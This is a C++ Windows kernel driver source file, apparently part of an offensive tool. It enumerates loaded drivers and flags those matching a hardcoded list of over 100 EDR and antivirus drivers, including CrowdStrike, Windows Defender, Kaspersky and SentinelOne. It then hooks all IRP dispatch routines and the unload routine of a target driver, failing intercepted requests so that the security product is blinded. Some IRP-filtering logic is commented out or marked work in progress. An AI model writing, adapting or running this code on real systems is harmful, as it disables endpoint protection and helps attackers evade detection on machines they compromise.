#include "pch.h"
#include "Intercept.h"

//globals
INTERCEPT_GLOBALS g_InterceptGlobals;

//https://github.com/SadProcessor/SomeStuff/blob/master/Invoke-EDRCheck.ps1
// IMPORTANT: if this structure is updated, make sure to increment EDR_DRIVER_COUNT accordingly in Globals.h:36
EDR_DRIVER_DATA g_EDRDriverData = {
	{
		{"atrsdfw.sys",L"AltirisSymantec"},
		{"avgtpx86.sys",L"AVGTechnologies"},
		{"avgtpx64.sys",L"AVGTechnologies"},
		{"naswSP.sys",L"Avast"},
		{"edrsensor.sys",L"BitDefenderSRL"},
		{"CarbonBlackK.sys",L"CarbonBlack"},
		{"parity.sys",L"CarbonBlack"},
		{"csacentr.sys",L"Cisco"},
		{"csaenh.sys",L"Cisco"},
		{"csareg.sys",L"Cisco"},
		{"csascr.sys",L"Cisco"},
		{"csaav.sys",L"Cisco"},
		{"csaam.sys",L"Cisco"},
		{"rvsavd.sys",L"CJSCReturnilSoftware"},
		{"cfrmd.sys",L"ComodoSecurity"},
		{"cmdccav.sys",L"ComodoSecurity"},
		{"cmdguard.sys",L"ComodoSecurity"},
		{"CmdMnEfs.sys",L"ComodoSecurity"},
		{"MyDLPMF.sys",L"ComodoSecurity"},
		{"cesguard.sys",L"ComodoSecurity"},
		{"cesfw.sys",L"ComodoSecurity"},
		{"im.sys",L"CrowdStrike"},
		{"csagent.sys",L"CrowdStrike"},
		{"CybKernelTracker.sys",L"CyberArkSoftware"},
		{"CRExecPrev.sys",L"Cybereason"},
		{"CrDrv.sys",L"Cybereason"},
		{"gzflt.sys",L"Cybereason"},
		{"CrElam.sys",L"Cybereason"},
		{"CyOptics.sys",L"CylanceInc."},
		{"CyProtectDrv32.sys",L"CylanceInc."},
		{"CyProtectDrv64.sys",L"CylanceInc."},
		{"groundling32.sys",L"DellSecureworks"},
		{"groundling64.sys",L"DellSecureworks"},
		{"esensor.sys",L"Endgame"},
		{"edevmon.sys",L"ESET"},
		{"ehdrv.sys",L"ESET"},
		{"epfw.sys",L"ESET"},
		{"epfwwfp.sys",L"ESET"},
		{"eamonm.sys",L"ESET"},
		{"ekbdflt.sys",L"ESET"},
		{"FeKern.sys",L"FireEye"},
		{"WFP_MRT.sys",L"FireEye"},
		{"xfsgk.sys",L"F-Secure"},
		{"fsatp.sys",L"F-Secure"},
		{"fshs.sys",L"F-Secure"},
		{"HexisFSMonitor.sys",L"HexisCyberSolutions"},
		{"klifks.sys",L"Kaspersky"},
		{"klifaa.sys",L"Kaspersky"},
		{"Klifsm.sys",L"Kaspersky"},
		{"klif.sys",L"Kaspersky"},
		{"klhk.sys",L"Kaspersky"},
		{"klgse.sys",L"Kaspersky"},
		{"klupd_klif_arkmon.sys",L"Kaspersky"},
		{"klflt.sys",L"Kaspersky"},
		{"kldisk.sys",L"Kaspersky"},
		{"klpnpflt.sys",L"Kaspersky"},
		{"klwfp.sys",L"Kaspersky"},
		{"kneps.sys",L"Kaspersky"},
		{"klwtp.sys",L"Kaspersky"},
		{"klkbdflt.sys",L"Kaspersky"},
		{"klkbdflt2.sys",L"Kaspersky"},
		{"klmouflt.sys",L"Kaspersky"},
		{"klpd.sys",L"Kaspersky"},
		{"klelam.sys",L"Kaspersky"},
		{"klim6.sys",L"Kaspersky"},
		{"klbackupflt.sys",L"Kaspersky"},
		{"cm_km.sys",L"Kaspersky"},
		{"klbackupdisk.sys",L"Kaspersky"},
		{"mbamwatchdog.sys",L"Malwarebytes"},
		{"mfeaskm.sys",L"McAfee"},
		{"edrdrv.sys",L"OpenEDR"},
		{"mfencfilter.sys",L"McAfee"},
		{"mssecflt.sys",L"Microsoft ATP"},
		{"PSINPROC.SYS",L"PandaSecurity"},
		{"PSINFILE.SYS",L"PandaSecurity"},
		{"amfsm.sys",L"PandaSecurity"},
		{"amm8660.sys",L"PandaSecurity"},
		{"amm6460.sys",L"PandaSecurity"},
		{"eaw.sys",L"RaytheonCyberSolutions"},
		{"SAFE-Agent.sys",L"SAFE-Cyberdefense"},
		{"SentinelMonitor.sys",L"SentinelOne"},
		{"SAVOnAccess.sys",L"Sophos"},
		{"savonaccess.sys",L"Sophos"},
		{"sld.sys",L"Sophos"},
		{"pgpwdefs.sys",L"Symantec"},
		{"GEProtection.sys",L"Symantec"},
		{"diflt.sys",L"Symantec"},
		{"sysMon.sys",L"Symantec"},
		{"ssrfsf.sys",L"Symantec"},
		{"emxdrv2.sys",L"Symantec"},
		{"reghook.sys",L"Symantec"},
		{"spbbcdrv.sys",L"Symantec"},
		{"bhdrvx86.sys",L"Symantec"},
		{"bhdrvx64.sys",L"Symantec"},
		{"SISIPSFileFilter",L"Symantec"},
		{"symevent.sys",L"Symantec"},
		{"vxfsrep.sys",L"Symantec"},
		{"VirtFile.sys",L"Symantec"},
		{"SymAFR.sys",L"Symantec"},
		{"symefasi.sys",L"Symantec"},
		{"symefa.sys",L"Symantec"},
		{"symefa64.sys",L"Symantec"},
		{"SymHsm.sys",L"Symantec"},
		{"evmf.sys",L"Symantec"},
		{"GEFCMP.sys",L"Symantec"},
		{"VFSEnc.sys",L"Symantec"},
		{"pgpfs.sys",L"Symantec"},
		{"fencry.sys",L"Symantec"},
		{"symrg.sys",L"Symantec"},
		{"ndgdmk.sys",L"VerdasysInc"},
		{"ssfmonm.sys",L"WebrootSoftware"},
		{"WdFilter.sys",L"WindowsDefender"},
		{"WdBoot.sys",L"WindowsDefender"},
		{"WdDevFlt.sys",L"WindowsDefender"},
		{"WdNisDrv.sys",L"WindowsDefender"},
		{"MpKslDrv.sys",L"WindowsDefender"}
	}
};

NTSTATUS ListDrivers(PINTERCEPTOR_BUFFER outBuffer) {
	NTSTATUS status;
	ULONG modulesSize = 0;
	PAUX_MODULE_EXTENDED_INFO modules;
	ULONG numberOfModules;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
		return status;

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), nullptr);
	if (!NT_SUCCESS(status) || modulesSize == 0)
		return status;

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (modules == nullptr)
		return STATUS_INSUFFICIENT_RESOURCES;

	RtlZeroMemory(modules, modulesSize);

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status)) {
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return status;
	}

	for (ULONG64 i = 0; i < numberOfModules; i++) {
		status = kwriteout(outBuffer, L"[%02llu] %S (0x%llx)", i, modules[i].FullPathName + modules[i].FileNameOffset, modules[i].BasicInfo.ImageBase);
		if (!NT_SUCCESS(status)) {
			return status;
		}

		status = CheckEDR(outBuffer, (char*)modules[i].FullPathName + modules[i].FileNameOffset);
		if (!NT_SUCCESS(status))
			return status;

		status = kwriteout(outBuffer, L"\n");
		if (!NT_SUCCESS(status))
			return status;
	}

	if (modules != NULL) {
		ExFreePoolWithTag(modules, DRIVER_TAG);
	}
	return status;
}

NTSTATUS GetDriverName(ULONG index, PCHAR& moduleName) {
	NTSTATUS status;
	ULONG modulesSize = 0;
	PAUX_MODULE_EXTENDED_INFO modules;
	ULONG numberOfModules;

	status = AuxKlibInitialize();
	if (!NT_SUCCESS(status))
		return status;

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), nullptr);
	if (!NT_SUCCESS(status) || modulesSize == 0)
		return status;

	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

	if (index >= numberOfModules)
		return STATUS_INVALID_PARAMETER;

	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
	if (modules == nullptr)
		return STATUS_INSUFFICIENT_RESOURCES;

	RtlZeroMemory(modules, modulesSize);

	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
	if (!NT_SUCCESS(status)) {
		ExFreePoolWithTag(modules, DRIVER_TAG);
		return status;
	}

	strcpy(moduleName, (CHAR*)(modules[index].FullPathName + modules[index].FileNameOffset));

	ExFreePoolWithTag(modules, DRIVER_TAG);
	return status;
}

NTSTATUS HookDriver(PCWSTR driverName) {

	int index = -1;
	for (int i = 0; i < MaxIntercept; i++) {
		if (g_InterceptGlobals.Drivers[i].DriverObject == nullptr) {
			if (index < 0)
				index = i;
		}
		else {
			if (_wcsicmp(g_InterceptGlobals.Drivers[i].DriverName, driverName) == 0) {
				return STATUS_SUCCESS;
			}
		}
	}

	UNICODE_STRING targetDriverName;
	RtlInitUnicodeString(&targetDriverName, (LPCWSTR)driverName);
	KdPrint((DRIVER_PREFIX "target driver name: %ws\n", driverName));

	//get DriverObject
	PDRIVER_OBJECT EDRDriverObject = nullptr;

	KdPrint((DRIVER_PREFIX "obtaining handle\n"));
	auto status = ObReferenceObjectByName(
		&targetDriverName,
		OBJ_CASE_INSENSITIVE,
		nullptr,
		0,
		*IoDriverObjectType,
		KernelMode,
		nullptr,
		(PVOID*)&EDRDriverObject
	);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "failed to obtain DriverObject (0x%08X)\n", status));
		return status;
	}

	//add driver + DriverObject to global array to track hooking status
	wcscpy_s(g_InterceptGlobals.Drivers[index].DriverName, driverName);

	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		//hook all dispatch routines
		g_InterceptGlobals.Drivers[index].MajorFunction[i] = static_cast<PDRIVER_DISPATCH>(InterlockedExchangePointer((PVOID*)&EDRDriverObject->MajorFunction[i], InterceptGenericDispatch));
	}

	//hook driverunload to prevent uncontrolled unloading by the target driver
	g_InterceptGlobals.Drivers[index].DriverUnload = static_cast<PDRIVER_UNLOAD>(InterlockedExchangePointer((PVOID*)&EDRDriverObject->DriverUnload, GenericDriverUnload));
	g_InterceptGlobals.Drivers[index].DriverObject = EDRDriverObject;
	g_InterceptGlobals.Count++;

	return STATUS_SUCCESS;
}

NTSTATUS UnhookDriver(PVOID DriverObject) {
	for (int i = 0; i < MaxIntercept; i++) {
		auto& driver = g_InterceptGlobals.Drivers[i];
		if (driver.DriverObject == DriverObject) {
			return UnhookDriver(i);
		}
	}
	return STATUS_INVALID_PARAMETER;
}

NTSTATUS UnhookDriver(int i) {
	auto& driver = g_InterceptGlobals.Drivers[i];
	for (int j = 0; j <= IRP_MJ_MAXIMUM_FUNCTION; j++) {
		InterlockedExchangePointer((PVOID*)&driver.DriverObject->MajorFunction[j], driver.MajorFunction[j]);
	}
	InterlockedExchangePointer((PVOID*)&driver.DriverUnload, driver.DriverUnload);

	g_InterceptGlobals.Count--;
	ObDereferenceObject(driver.DriverObject);
	driver.DriverObject = nullptr;

	return STATUS_SUCCESS;
}

NTSTATUS UnhookAllDrivers() {
	auto status = STATUS_SUCCESS;
	for (int i = 0; i < MaxIntercept; i++) {
		if (g_InterceptGlobals.Drivers[i].DriverObject)
			status = UnhookDriver(i);
	}
	if (NT_ASSERT(g_InterceptGlobals.Count == 0)) {
		return STATUS_SUCCESS;
	}
	else {
		return status;
	}
}

NTSTATUS InterceptGenericDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	//auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto status = STATUS_UNSUCCESSFUL; //STATUS_INVALID_DEVICE_REQUEST
	KdPrint((DRIVER_PREFIX "GenericDispatch: call intercepted\n"));

	/*
	//inspect IRP
	if (isTargetIrp(Irp)) {
		//modify IRP
		status = ModifyIrp(Irp);
		//call original
		for (int i = 0; i < MaxIntercept; i++) {
			if (g_InterceptGlobals.Drivers[i].DriverObject == DeviceObject->DriverObject) {
				auto CompletionRoutine = g_InterceptGlobals.Drivers[i].MajorFunction[stack->MajorFunction];
				return CompletionRoutine(DeviceObject, Irp);
			}
		}
	}
	else if (isDiscardIrp(Irp)) {
		//call own completion routine
		status = STATUS_INVALID_DEVICE_REQUEST;
		return CompleteRequest(Irp, status, 0);
	}
	else {
		//call original
		for (int i = 0; i < MaxIntercept; i++) {
			if (g_InterceptGlobals.Drivers[i].DriverObject == DeviceObject->DriverObject) {
				auto CompletionRoutine = g_InterceptGlobals.Drivers[i].MajorFunction[stack->MajorFunction];
				return CompletionRoutine(DeviceObject, Irp);
			}
		}
	}
	*/
	return CompleteRequest(Irp, status, 0);
}

void GenericDriverUnload(PDRIVER_OBJECT DriverObject) {
	for (int i = 0; i < MaxIntercept; i++) {
		if (g_InterceptGlobals.Drivers[i].DriverObject == DriverObject) {
			if (g_InterceptGlobals.Drivers[i].DriverUnload) {
				g_InterceptGlobals.Drivers[i].DriverUnload(DriverObject);
			}
			UnhookDriver(i);
		}
	}
	NT_ASSERT(false);
}

BOOLEAN isTargetIrp(PIRP Irp) {
	//TODO: WIP
	UNREFERENCED_PARAMETER(Irp);
	return true;
}

BOOLEAN isDiscardIrp(PIRP Irp) {
	//TODO: WIP
	UNREFERENCED_PARAMETER(Irp);
	return false;
}

NTSTATUS ModifyIrp(PIRP Irp) {
	//TODO: WIP
	UNREFERENCED_PARAMETER(Irp);
	return STATUS_INVALID_DEVICE_REQUEST;
}

NTSTATUS CheckEDR(PINTERCEPTOR_BUFFER outBuffer, PCHAR module) {
	NTSTATUS status = STATUS_SUCCESS;

	for (int i = 0; i < EDR_DRIVER_COUNT; i++) {
		if (strcmp(g_EDRDriverData.EDR[i].name, module) == 0) {
			return kwriteout(outBuffer, L" [EDR: %s]", g_EDRDriverData.EDR[i].vendor);
		}
	}
	return status;
}